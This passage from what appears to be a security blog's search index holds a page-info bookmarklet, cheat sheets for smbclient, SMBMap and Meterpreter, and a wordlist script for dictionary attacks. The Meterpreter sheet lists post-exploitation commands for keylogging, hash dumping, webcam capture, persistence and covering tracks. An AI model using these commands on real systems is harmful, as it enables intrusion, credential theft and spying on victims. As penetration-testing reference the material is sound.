activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective—sometimes, that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Meterpreter, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\nBasic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. Final Thoughts Meterpreter is your trusty post-exploitation buddy. Use it wisely, creatively, and responsibly. Keep this cheat sheet handy for quick reference—whether you\u0026rsquo;re downloading files, snapping screenshots, or simply making your mark in the digital shadows. Happy hacking!\n","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003cp\u003e\u003cstrong\u003eMeterpreter\u003c/strong\u003e, the post-exploitation payload for Metasploit, is your Swiss Army knife for interacting with compromised systems. It provides a suite of commands to navigate, persist, and extract information from your target.\u003c/p\u003e\n\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your 